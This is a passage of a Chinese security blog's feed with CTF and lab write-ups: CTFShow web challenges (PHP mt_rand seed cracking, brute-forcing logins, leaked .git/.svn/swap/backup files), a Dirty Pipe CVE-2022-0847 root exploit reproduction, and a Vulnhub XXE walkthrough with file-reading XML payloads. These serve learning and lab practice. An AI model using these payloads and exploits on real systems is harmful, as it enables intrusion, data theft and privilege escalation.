class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>my_srand()函数</p><blockquote><p>mt_srand() 播种 Mersenne Twister 随机数生成器。<br>mt_srand(seed)<br>seed 必需。用seed来给随机数发生器播种</p><p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到运行结果</p><p><img src="/posts/7ba9ac12/image-20220321163809287.png" alt="image-20220321163809287"></p><p>这里有个问题：不同的php版本得到的结果可能不一样 我使用的php版本得到的结果是 999695185但是在菜鸟在线运行工具中的得到的结果是上图 ，这道题的答案也是上图</p><p>已get方式通过r传参</p><p>得到flag</p><p><img src="/posts/7ba9ac12/image-20220321164027209.png" alt="image-20220321164027209"></p><h2 id="Web25"><a href="#Web25" class="headerlink" title="Web25"></a>Web25</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a> </p><p><a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p><p>mt_srand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 在之前自己还以为需要暴力破解cookie,最后师傅们给我介绍了一个脚本，专门用来跑mt_srand()种子和 mt_rand()随机数的 这里自己解释一下为什么每一次的mt_rand()+mt_rand()不是第一次的随机数相加？？ 因为生成的随机数可以说是一个线性变换（实际上非常复杂）的每一次的确定的但是每一次是不一样的，所以不能 进行第一次*2就得到mt_rand()+mt_rand() 使用说只要我们得到种子就可以在本地进行获得自己想要的值 </p><p>解题：通过随机数来寻找种子 我们让 ?r&#x3D;0 得到随机数。这里我得到的是 183607393 每一次不一样(因为flag值在变化) 然后下载 php_mt_seed4.0 我们在linux下面使用 gcc进行编译 gcc php_mt_seed.c -o php_mt_seed 之后运行脚本添加随机数 .&#x2F;php_mt_seed 183607393</p></blockquote><p>这道题先把flag的进行md5加密并取前8位然后进行16进制转10进制最后得到的值作为种子来生成随机数</p><p>通过cookie得到的token要等于两个随机数相加 （这个两个随机数并不相同）</p><p>同时我们可以通过?r&#x3D;0传参得到生成的随机数 因为如果r为零则回执行else语句输出随机数的负数</p><p><img src="/posts/7ba9ac12/image-20220322090313211.png" alt="image-20220322090313211"></p><p>这里我得到的随机数是585666240</p><p>接下来使用脚本得到可能的seed值</p><p>放到linux下编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd php_mt_seed-4.0 </span><br><span class="line">gcc php_mt_seed.c -o php_mt_seed</span><br><span class="line">/php_mt_seed 737212628</span><br></pre></td></tr></table></figure><p>接下来是漫长的等待</p><p><img src="/posts/7ba9ac12/image-20220322095150965.png" alt="image-20220322095150965"></p><p>通过响应头发现php的版本为7.3.11</p><p><img src="/posts/7ba9ac12/image-20220321231926792.png" alt="image-20220321231926792"></p><p>得到</p><p>接下来计算下两个随机数相加</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">3842734643</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到:</p><p>585666240<br>1350320544</p><p>接下来传参</p><p>通过get 传参?r&#x3D;585666240</p><p>抓包修改cookie  token&#x3D;1350320544</p><p>得到flag</p><p><img src="/posts/7ba9ac12/image-20220322095242899.png" alt="image-20220322095242899"></p><h2 id="Web26"><a href="#Web26" class="headerlink" title="Web26"></a>Web26</h2><p><img src="/posts/7ba9ac12/image-20220322143458709.png" alt="image-20220322143458709"></p><p>右键查看源代码发现javascript代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)&#123;</span><br><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line"><span class="attr">url</span>:<span class="string">&#x27;checkdb.php&#x27;</span>,</span><br><span class="line"><span class="attr">type</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line"><span class="attr">dataType</span>:<span class="string">&#x27;json&#x27;</span>,</span><br><span class="line"><span class="attr">data</span>:&#123;</span><br><span class="line"><span class="string">&#x27;a&#x27;</span>:$(<span class="string">&#x27;#a&#x27;</span>).<span class="title function_">val</span>(),</span><br><span class="line"><span class="string">&#x27;p&#x27;</span>:$(<span class="string">&#x27;#p&#x27;</span>).<span class="title function_">val</span>(),</span><br><span class="line"><span class="string">&#x27;d&#x27;</span>:$(<span class="string">&#x27;#d&#x27;</span>).<span class="title function_">val</span>(),</span><br><span class="line"><span class="string">&#x27;u&#x27;</span>:$(<span class="string">&#x27;#u&#x27;</span>).<span class="title function_">val</span>(),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:$(<span class="string">&#x27;#pass&#x27;</span>).<span class="title function_">val</span>()</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line"><span class="title function_">alert</span>(data[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">error</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line"><span class="title function_">alert</span>(data[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用post提交返回一个json</p><p><img src="/posts/7ba9ac12/image-20220322144328975.png" alt="image-20220322144328975"></p><p>接下来对pass进行爆破</p><p><img src="/posts/7ba9ac12/image-20220322145311919.png" alt="image-20220322145311919"></p><p>密码为7758521</p><p>查看返回包</p><p><img src="/posts/7ba9ac12/image-20220322145407656.png" alt="image-20220322145407656"></p><p>得到flag</p><h2 id="Web27"><a href="#Web27" class="headerlink" title="Web27"></a>Web27</h2><p><img src="/posts/7ba9ac12/image-20220322150028820.png" alt="image-20220322150028820"></p><p>点击录取名单 得到一个表格</p><p><img src="/posts/7ba9ac12/image-20220322150556267.png" alt="image-20220322150556267"></p><p>可以看出来身份证哪里缺少了生日部分</p><p>点击进入学籍管理系统</p><p><img src="/posts/7ba9ac12/image-20220322150920971.png" alt="image-20220322150920971"></p><p>姓名 我们有了 身份证号缺少生日部分</p><p>抓包爆破 这里我用火狐抓的包有问题，换到chrome就好了</p><p><img src="/posts/7ba9ac12/image-20220322151658846.png" alt="image-20220322151658846"></p><p><img src="/posts/7ba9ac12/image-20220322151959622.png" alt="image-20220322151959622"></p><p><img src="/posts/7ba9ac12/image-20220322152050729.png" alt="image-20220322152050729"></p><p>得到出生日期 看回包</p><p>还以为是flag 没想到是unicode编码</p><p><img src="/posts/7ba9ac12/image-20220322152154775.png" alt="image-20220322152154775"></p><p><img src="/posts/7ba9ac12/image-20220322152401867.png" alt="image-20220322152401867"></p><p>登录 教务系统</p><p>拿到flag</p><p><img src="/posts/7ba9ac12/image-20220322152542559.png" alt="image-20220322152542559"></p><h2 id="Web28"><a href="#Web28" class="headerlink" title="Web28"></a>Web28</h2><p>where is flag?</p><p><img src="/posts/7ba9ac12/image-20220322153030411.png" alt="image-20220322153030411"></p><p><img src="/posts/7ba9ac12/image-20220322153115359.png" alt="image-20220322153115359"></p><p>看到url 的目录有点奇怪</p><p>继续抓包爆破</p><p><img src="/posts/7ba9ac12/image-20220322161517660.png" alt="image-20220322161517660"></p><p>第一，二位置配置一样</p><p><img src="/posts/7ba9ac12/image-20220322153553364.png" alt="image-20220322153553364"></p><p><img src="/posts/7ba9ac12/image-20220322161457124.png" alt="image-20220322161457124"></p><p>查看回包</p><p><img src="/posts/7ba9ac12/image-20220322161547231.png" alt="image-20220322161547231"></p><p>拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow Web入门_信息搜集</title>
      <link href="/posts/a805ee79/"/>
      <url>/posts/a805ee79/</url>
      
        <content type="html"><![CDATA[<h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p><img src="/posts/a805ee79/image-20220314225911075.png" alt="image-20220314225911075"></p><p>右键查看源代码</p><p><img src="/posts/a805ee79/image-20220314225935080.png" alt="image-20220314225935080"></p><p>发现falg</p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p><img src="/posts/a805ee79/image-20220314230516946.png" alt="image-20220314230516946"></p><p>发现无法右键</p><p>使用BP抓包刷新抓取数据包放到重放器发送数据包</p><p><img src="/posts/a805ee79/image-20220314230633907.png" alt="image-20220314230633907"></p><p>拿到flag</p><p>也可以使用火狐浏览器右上角菜单更多工具中的Web开发者工具</p><p><img src="/posts/a805ee79/image-20220314231209183.png" alt="image-20220314231209183"></p><p><img src="/posts/a805ee79/image-20220314231126090.png" alt="image-20220314231126090"></p><p><img src="/posts/a805ee79/image-20220314231233391.png" alt="image-20220314231233391"></p><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p><img src="/posts/a805ee79/image-20220314231700848.png" alt="image-20220314231700848"></p><p>老样子用BP抓包看下</p><p>返回包中发现flag</p><p><img src="/posts/a805ee79/image-20220314231738223.png" alt="image-20220314231738223"></p><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p>在url后加上&#x2F;robots.txt查看爬虫文件</p><p><img src="/posts/a805ee79/image-20220314232149792.png" alt="image-20220314232149792"></p><p>发现一个文件</p><p>访问</p><p><img src="/posts/a805ee79/image-20220314232215855.png" alt="image-20220314232215855"></p><p>出现flag</p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p><img src="/posts/a805ee79/image-20220315171803308.png" alt="image-20220315171803308"></p><p>phps源代码泄露</p><p>访问index.phps</p><p><img src="/posts/a805ee79/image-20220315171853386.png" alt="image-20220315171853386"></p><p><img src="/posts/a805ee79/image-20220315171858003.png" alt="image-20220315171858003"></p><p><img src="/posts/a805ee79/image-20220315171942410.png" alt="image-20220315171942410"></p><p>拿到flag</p><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p>根据题目</p><p><img src="/posts/a805ee79/image-20220315190811938.png" alt="image-20220315190811938"></p><p>访问<a href="http://www.zip/">www.zip</a></p><p><img src="/posts/a805ee79/image-20220315190854205.png" alt="image-20220315190854205"></p><p><img src="/posts/a805ee79/image-20220315190907580.png" alt="image-20220315190907580"></p><p>拿到flag</p><p>提交</p><p><img src="/posts/a805ee79/image-20220315191209690.png" alt="image-20220315191209690"></p><p>是个假flag</p><p>看到题目说解压到了当前目录 直接访问fl000g.txt试下</p><p><img src="/posts/a805ee79/image-20220315191310368.png" alt="image-20220315191310368"></p><p>出现flag</p><h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><p><img src="/posts/a805ee79/image-20220315192327345.png" alt="image-20220315192327345"></p><p>git源码泄露</p><p>访问.git</p><p><img src="/posts/a805ee79/image-20220315192408795.png" alt="image-20220315192408795"></p><p>拿到flag</p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p><img src="/posts/a805ee79/image-20220315192940618.png" alt="image-20220315192940618"></p><p>还是版本控制</p><p>除了git还有一个版本控制是svn</p><p>直接访问.svn</p><p><img src="/posts/a805ee79/image-20220315193042837.png" alt="image-20220315193042837"></p><p>拿到flag</p><h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><p><img src="/posts/a805ee79/image-20220315194812318.png" alt="image-20220315194812318"></p><p>这个题主要考察 vim的缓存泄露</p><blockquote><p>以 index.php 为例 </p><p>第一次产生的缓存文件名为 .index.php.swp<br>第二次意外退出后，文件名为.index.php.swo<br>第三次产生的缓存文件则为 .index.php.swn<br>注意：index前有 “ . “</p></blockquote><p>访问index.php.swp</p><p><img src="/posts/a805ee79/image-20220315195216485.png" alt="image-20220315195216485"></p><p><img src="/posts/a805ee79/image-20220315195242027.png" alt="image-20220315195242027"></p><p>拿到flag</p><h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><p><img src="/posts/a805ee79/image-20220315211938803.png" alt="image-20220315211938803"></p><p>F12打开开发者工具 打开网络抓包，查看cookie</p><p><img src="/posts/a805ee79/image-20220315212145315.png" alt="image-20220315212145315"></p><h2 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h2><p><img src="/posts/a805ee79/image-20220315212420525.png" alt="image-20220315212420525"></p><p>使用域名解析查看</p><p><a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p><p><img src="/posts/a805ee79/image-20220315212610660.png" alt="image-20220315212610660"></p><h2 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h2><p><img src="/posts/a805ee79/image-20220315213126831.png" alt="image-20220315213126831"></p><p><img src="/posts/a805ee79/image-20220315213119215.png" alt="image-20220315213119215"></p><p>一个购物界面</p><p>页面最下面发现一串可以数字</p><p><img src="/posts/a805ee79/image-20220315213043070.png" alt="image-20220315213043070"></p><p>根据题目我们要进入到后台</p><p>看下robots.txt爬虫文件看下有什么目录</p><p><img src="/posts/a805ee79/image-20220315213223077.png" alt="image-20220315213223077"></p><p>发现一个admin目录</p><p><img src="/posts/a805ee79/image-20220315213247394.png" alt="image-20220315213247394"></p><p>用户名admin 密码就是上面那串数字</p><p><img src="/posts/a805ee79/image-20220315213334050.png" alt="image-20220315213334050"></p><p>拿到flag</p><h2 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h2><p><img src="/posts/a805ee79/image-20220315213423939.png" alt="image-20220315213423939"></p><p>页面最下面查看文档</p><p><img src="/posts/a805ee79/image-20220315213753195.png" alt="image-20220315213753195"></p><p><img src="/posts/a805ee79/image-20220315213826590.png" alt="image-20220315213826590"></p><p>发现目标</p><p>访问目录&#x2F;system1103&#x2F;login.php</p><p><img src="/posts/a805ee79/image-20220315213947106.png" alt="image-20220315213947106"></p><p>使用默认密码登录</p><p><img src="/posts/a805ee79/image-20220315214022669.png" alt="image-20220315214022669"></p><p>拿到flag</p><h2 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h2><p><img src="/posts/a805ee79/image-20220315214124007.png" alt="image-20220315214124007"></p><p>打开 链接像是某个app的官方界面</p><p>根据题目访问&#x2F;editor</p><p><img src="/posts/a805ee79/image-20220315215323992.png" alt="image-20220315215323992"></p><p>是一个编辑器，点击图片</p><p><img src="/posts/a805ee79/image-20220315215344782.png" alt="image-20220315215344782"></p><p>点击图片空间可以遍历服务器目录</p><p><img src="/posts/a805ee79/image-20220315215434205.png" alt="image-20220315215434205"></p><p>发现flag文件</p><p>接下来在url访问，直接在url后面加&#x2F;nothinghere&#x2F;fl000g.txt</p><p><img src="/posts/a805ee79/image-20220315215523391.png" alt="image-20220315215523391"></p><p>拿到flag</p><h2 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h2><p><img src="/posts/a805ee79/image-20220315215807585.png" alt="image-20220315215807585"></p><p><img src="/posts/a805ee79/image-20220315215953619.png" alt="image-20220315215953619"></p><p>打开页面最下面发现一个邮箱</p><p>url后面输入admin进入到后台</p><p>发现一个忘记密码的操作</p><p><img src="/posts/a805ee79/image-20220315220408424.png" alt="image-20220315220408424"></p><p>我们刚才得到一个邮箱 正好是qq邮箱可以通过qq信息查看城市</p><p><img src="/posts/a805ee79/image-20220315220733711.png" alt="image-20220315220733711"></p><p>在西安</p><p><img src="/posts/a805ee79/image-20220315220811268.png" alt="image-20220315220811268"></p><p>登录后台拿到flag</p><p><img src="/posts/a805ee79/image-20220315220903318.png" alt="image-20220315220903318"></p><h2 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h2><p><img src="/posts/a805ee79/image-20220315221153306.png" alt="image-20220315221153306"></p><p>在url后面添加tz.php</p><p><img src="/posts/a805ee79/image-20220315221807760.png" alt="image-20220315221807760"></p><p>进入探针页面查看phpinfor</p><p>搜索flag</p><p><img src="/posts/a805ee79/image-20220315221855292.png" alt="image-20220315221855292"></p><p>拿到flag</p><h2 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h2><p><img src="/posts/a805ee79/image-20220315222018553.png" alt="image-20220315222018553"></p><p>备份文件一般命名为backup访问backup.sql</p><p><img src="/posts/a805ee79/image-20220315222236426.png" alt="image-20220315222236426"></p><p><img src="/posts/a805ee79/image-20220315222251785.png" alt="image-20220315222251785"></p><p>拿到flag</p><h2 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h2><p><img src="/posts/a805ee79/image-20220315222502436.png" alt="image-20220315222502436"></p><p>使用开发者工具查看js文件</p><p><img src="/posts/a805ee79/image-20220315223020389.png" alt="image-20220315223020389"></p><p>解码看下</p><p><img src="/posts/a805ee79/image-20220315223049696.png" alt="image-20220315223049696"></p><p>访问110.php</p><p><img src="/posts/a805ee79/image-20220315223113606.png" alt="image-20220315223113606"></p><p>拿到flag</p><h2 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h2><p><img src="/posts/a805ee79/image-20220315223607588.png" alt="image-20220315223607588"></p><p>右键查看源代码</p><p><img src="/posts/a805ee79/image-20220315223646712.png" alt="image-20220315223646712"></p><p>发现账号密码</p><p>hackbar使用post提交</p><p><img src="/posts/a805ee79/image-20220315224036124.png" alt="image-20220315224036124"></p><p><img src="/posts/a805ee79/image-20220315224042961.png" alt="image-20220315224042961"></p><p>拿到flag</p><h2 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h2><blockquote><p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p></blockquote><p>访问&#x2F;db&#x2F;db.mdb</p><p>下载数据库备份文件</p><p>使用easyaccess打开搜索flag</p><p><img src="/posts/a805ee79/image-20220315225015240.png" alt="image-20220315225015240"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-0847 Linux内核提权漏洞复现</title>
      <link href="/posts/77a28503/"/>
      <url>/posts/77a28503/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2022-0847Linux内核提权漏洞复现"><a href="#CVE-2022-0847Linux内核提权漏洞复现" class="headerlink" title="CVE-2022-0847Linux内核提权漏洞复现"></a>CVE-2022-0847Linux内核提权漏洞复现</h1><blockquote><p>漏洞影响版本：5.8 &lt;&#x3D; Linux kernel &lt; 5.16.11&#x2F;5.15.25&#x2F;5.10.102</p><p>POC:<a href="https://haxx.in/files/dirtypipez.c">https://haxx.in/files/dirtypipez.c</a></p></blockquote><blockquote><p>漏洞原理：<a href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com</a></p></blockquote><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Linux RedTeam 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 (2022-01-31) x86_64 GNU&#x2F;Linux</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit: A root exploit for CVE-2022-0847 (Dirty Pipe) (github.com)</a></p><p>使用方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./compile.sh</span><br><span class="line">./exploit  </span><br></pre></td></tr></table></figure><p>执行成功后root密码变为aaron使用命令su输入密码即可进入root命令行</p><p>部分执行完成后直接进入shell</p><p><img src="/posts/77a28503/yDazi35C1ZqLEXF-16590095805203.png" alt="yDazi35C1ZqLEXF"></p><p>恢复密码命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub XXE靶机渗透记录</title>
      <link href="/posts/8c5d5e49/"/>
      <url>/posts/8c5d5e49/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub-XXE靶场复现"><a href="#Vulnhub-XXE靶场复现" class="headerlink" title="Vulnhub-XXE靶场复现"></a>Vulnhub-XXE靶场复现</h1><p>靶场地址：<a href="https://download.vulnhub.com/xxe/XXE.zip">https://download.vulnhub.com/xxe/XXE.zip</a></p><p><strong>1、nmap扫描主机</strong></p><p>靶机没有密码只有扫描</p><p><img src="/posts/8c5d5e49/image-20220307224327734.png" alt="image-20220307224327734"></p><p>扫到一个开放80端口的主机 打开浏览器看下</p><p><img src="/posts/8c5d5e49/image-20220307224411581.png" alt="image-20220307224411581"></p><p>好像并没有什么</p><p>使用目录扫描工具扫下</p><p><img src="/posts/8c5d5e49/image-20220307224832118.png" alt="image-20220307224832118"></p><p>看到robots.txt爬虫文件打卡看下</p><p><img src="/posts/8c5d5e49/image-20220307224904223.png" alt="image-20220307224904223"></p><p>发现一个xxe目录</p><p>进去看下</p><p><img src="/posts/8c5d5e49/image-20220307224931306.png" alt="image-20220307224931306"></p><p>是个登录框</p><p>使用弱口令抓包试下</p><p><strong>2、发现xxe漏洞</strong></p><p><img src="/posts/8c5d5e49/image-20220307225204537.png" alt="image-20220307225204537"></p><p>xml格式</p><p>使用读文件payload试下能不能读passwd文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file://&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功</p><p>接下来针对admin.php看下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/8c5d5e49/image-20220307230938074.png" alt="image-20220307230938074"></p><p>发现一段base64加密</p><p><img src="/posts/8c5d5e49/image-20220307231024452.png" alt="image-20220307231024452"></p><p><img src="/posts/8c5d5e49/image-20220307231122838.png" alt="image-20220307231122838"></p><p>发现md5加密的密码</p><p><img src="/posts/8c5d5e49/image-20220307231152070.png" alt="image-20220307231152070"></p><p>登录看看</p><p>注意admin.php是在xxe目录下 因为我们刚才在使用读文件协议实在xxe目录下</p><p><img src="/posts/8c5d5e49/image-20220307231609573.png" alt="image-20220307231609573"></p><p><img src="/posts/8c5d5e49/image-20220307231615415.png" alt="image-20220307231615415"></p><p>什么都没有</p><p>使用读文件协议读下flagmeout.php</p><p><img src="/posts/8c5d5e49/image-20220307231824201.png" alt="image-20220307231824201"></p><p>base64解码</p><p><img src="/posts/8c5d5e49/image-20220307231858595.png" alt="image-20220307231858595"></p><p>得到一串不熟悉的编码。</p><p>好吧，这是base32</p><p><img src="/posts/8c5d5e49/image-20220307232016835.png" alt="image-20220307232016835"></p><p>又是个base64</p><p><img src="/posts/8c5d5e49/image-20220307232058821.png" alt="image-20220307232058821"></p><p>继续读&#x2F;etc&#x2F;.flag.php</p><p><img src="/posts/8c5d5e49/image-20220307232311983.png" alt="image-20220307232311983"></p><p>继续解码</p><p><img src="/posts/8c5d5e49/image-20220307232342978.png" 